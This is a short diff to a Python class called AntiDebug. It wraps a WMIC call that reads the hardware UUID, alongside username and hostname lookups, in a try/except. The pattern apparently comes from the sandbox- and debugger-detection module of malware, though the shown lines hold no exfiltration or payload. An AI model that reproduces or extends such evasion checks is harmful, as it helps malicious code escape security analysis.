@@ -55,8 +55,11 @@ class AntiDebug:
             return True
 
     def get_system(self) -> Literal[True] | None:
-        hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
-                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+        try:
+            hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
+                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+        except:
+            hwid = "None"
 
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
